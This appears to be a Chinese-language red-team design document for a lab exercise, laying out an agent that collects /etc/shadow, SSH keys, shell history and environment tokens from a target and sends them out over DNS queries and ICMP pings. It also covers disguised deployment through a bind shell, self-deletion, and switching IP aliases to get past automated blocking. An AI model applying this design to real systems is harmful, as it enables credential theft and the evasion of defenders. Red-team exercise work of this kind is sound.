# Exfiltration 隱蔽通道設計

## 目標

在紅隊 kill chain 加入 Exfiltration (TA0010) 階段，用 DNS 跟 ICMP 隱蔽通道把靶機資料外傳到攻擊機，繞過藍軍的 tshark (`tcp port 9999`) 監控。

## 架構

```
[靶機 ad_target]                          [攻擊機 WSL2]

exfil_agent.py                            exfil_listener.py
  ├─ 自動蒐集檔案                           ├─ 監聽 DNS (UDP 53)
  ├─ 偵測可用通道                            ├─ 監聽 ICMP
  ├─ 編碼 + 分塊                            ├─ 重組 + 解碼
  └─ 發送                                  └─ 儲存至 ./loot/
       │                                        ▲
       │  DNS: <seq>.<data>.<id>.x.exfil.local   │
       ├────────── UDP 53 ──────────────────────┤
       │  ICMP: ping -p <hex_data>               │
       └────────── ICMP ────────────────────────┘
```

兩個檔案：
- `exfil_agent.py` — 部署到靶機，蒐集 + 發送
- `exfil_listener.py` — WSL2 上執行，接收 + 重組

## 資料蒐集目標

| 類別 | 目標路徑 | 價值 |
|------|----------|------|
| 系統帳號 | `/etc/passwd` | 使用者列表 |
| 密碼雜湊 | `/etc/shadow` | 嘗試讀取 |
| 排程任務 | `crontab -l` 輸出 | 持久化 / 任務 |
| SSH 金鑰 | `~/.ssh/*` | 橫向移動 |
| 應用原始碼 | `~/vuln_api.py` | 目標應用邏輯 |
| 蜜罐日誌 | `~/trap.log` | 藍軍偵測能力 |
| 歷史指令 | `~/.bash_history` | 情報蒐集 |
| 環境變數 | `env` 輸出 | 可能含密碼/token |
| 其他使用者 | `/home/*/.bash_history` | 其他帳號活動 |
| 其他使用者 | `/home/*/.ssh/*` | 更多 SSH 金鑰 |
| 其他使用者 | `/home/*/*.py` | 其他腳本/原始碼 |
| 其他使用者 | `/home/*/.bashrc` | 可能含 alias/密碼 |

邏輯：先從 `/etc/passwd` 取得使用者清單，逐一掃描 home 目錄。讀不到靜默跳過。

## 通道協議

### DNS 通道（主通道）

```
查詢格式: <seq>-<total>.<base32_data>.<file_id>.x.exfil.local

範例: 0003-0042.JBSWY3DPEB3W64TMMQQQ.a1b2.x.exfil.local
       │    │    │                    │   └─ 固定後綴
       │    │    │                    └─ 檔案 ID (4 chars hash)
       │    │    └─ 資料塊 (base32，DNS-safe)
       │    └─ 總塊數
       └─ 序號
```

- 每個 DNS label 上限 63 chars，實際資料約 50 bytes/query
- 使用 `dig` 或 `nslookup` 發送，不需 root
- 每次 query 間隔隨機 0.1-0.5 秒
- 開始信號: `START.<file_id>.<filename_base32>.x.exfil.local`
- 結束信號: `END.<file_id>.<md5_checksum>.x.exfil.local`

### ICMP 通道（備用通道）

```
ping -c 1 -s <seq_encoded> -p <16bytes_hex_data> <attacker_ip>

範例: ping -c 1 -s 1003 -p 4A42535759334450454233 <attacker_ip>
                   │          │
                   │          └─ hex 編碼資料 (16 bytes)
                   └─ packet size = 1000 + seq (size 編碼序號)
```

- 每個 ping 攜帶 16 bytes 資料
- `-s` 欄位編碼序號：`size = 1000 + seq_number`
- 同樣有 START/END 信號與 checksum 驗證
- 僅在 DNS 不可用時自動切換

### 自動偵測邏輯

```
啟動 exfil_agent.py
  ├─ 測試 dig google.com → 成功 → 用 DNS 通道
  ├─ 測試 ping -c 1 <attacker_ip> → 成功 → 用 ICMP 通道
  └─ 兩者都失敗 → 印出錯誤，中止
```

## 執行流程

### 攻擊機 (WSL2)

```bash
# 1. 啟動接收器
sudo python3 exfil_listener.py

# 2. 正常攻擊流程
python3 exploit.py <TARGET_IP>
nc -v <TARGET_IP> 4444

# 3. 在 bind shell 內部署 agent
echo '<base64_of_exfil_agent.py>' | base64 -d > /tmp/.cache_update.py
python3 /tmp/.cache_update.py <WSL2_IP>

# 4. 回到 listener 觀察接收，檔案存到 ./loot/
```

## 隱蔽措施

| 項目 | 做法 |
|------|------|
| 部署偽裝 | 腳本名 `.cache_update.py`，放 `/tmp/` |
| 執行後自刪 | agent 完成後 `os.remove(__file__)` |
| 隨機延遲 | 每個 query 間隔 0.1-0.5s 隨機 |
| 完整性驗證 | 每個檔案結束送 MD5 checksum |
| 錯誤靜默 | 讀不到的檔案靜默跳過，無 stderr |

## IP 切換策略 (繞過 MDR 封鎖)

Demo 時需展示攻擊 port 2222 觸發蜜罐，但 MDR 會自動封鎖 IP。透過 IP alias 切換身份繼續攻擊。

- MITRE ATT&CK: T1036 (Masquerading)
- 介面: `eth0`
- 主 IP: `172.22.137.14` (用於觸發蜜罐，預期被封)
- 備用 IP: `172.22.137.15` (切換後繼續攻擊 9999)
- 管理腳本: `ip_switch.sh`

```
Demo 順序:
1. ./ip_switch.sh add           ← 掛載備用 IP
2. nc -v <TARGET> 2222          ← 用主 IP 觸發蜜罐 (被 MDR 封鎖)
3. python3 exploit.py <TARGET>  ← 自動走備用 IP 繞過封鎖
4. nc -s 172.22.137.15 -v <TARGET> 4444
5. ./ip_switch.sh remove        ← Demo 結束清理
```

## 本機 (WSL2) 安全約束

本節確保攻擊工具不會反過來危害攻擊機自身。

### Listener 網路安全

| 風險 | 對策 |
|------|------|
| 監聽 UDP 53 / ICMP 需 sudo | listener 啟動後立即 drop root 權限 (`os.setuid`) 降回一般使用者 |
| 監聽介面暴露 | 僅綁定指定介面 IP，不使用 `0.0.0.0` |
| 惡意封包攻擊 listener | 所有接收資料嚴格驗證格式（正則匹配），不符合協議格式的封包直接丟棄 |
| 長時間開 port | listener 設定 timeout，蒐集完成或超時後自動關閉 |

### 檔案寫入安全

| 風險 | 對策 |
|------|------|
| Path traversal (檔名含 `../`) | 儲存時 `os.path.basename()` 強制去除路徑，僅寫入 `./loot/` |
| 覆蓋本機檔案 | loot 目錄預先建立，檔案重複時加 suffix 不覆蓋 |
| 寫入可執行檔 | 所有 loot 檔案權限設為 `0o600`（僅讀寫，不可執行） |

### 資料處理安全

| 風險 | 對策 |
|------|------|
| 接收資料含惡意內容 | listener 僅做 decode + 寫檔，不 eval/exec 任何接收內容 |
| Base32/Hex decode 異常 | 解碼失敗靜默丟棄該 chunk，記錄 warning |
| 記憶體耗盡 | 單檔上限 10MB，超過自動停止該檔接收 |

### 運行後清理

- Listener 結束時自動關閉所有 socket
- 不在本機留下暫存檔或 cache
- 日誌僅輸出到 stdout，不寫入磁碟（避免留下操作痕跡由他人讀取）

## MITRE ATT&CK 新增覆蓋

| 戰術 | 技術 ID | 說明 |
|------|---------|------|
| Collection | T1005 | Data from Local System |
| Exfiltration | T1048.003 | Exfiltration Over Unencrypted Non-C2 Protocol (DNS) |
| Exfiltration | T1048.003 | Exfiltration Over Unencrypted Non-C2 Protocol (ICMP) |
| Defense Evasion | T1070.004 | File Deletion (agent 自刪) |

覆蓋率從 9/14 提升至 10/14 戰術。
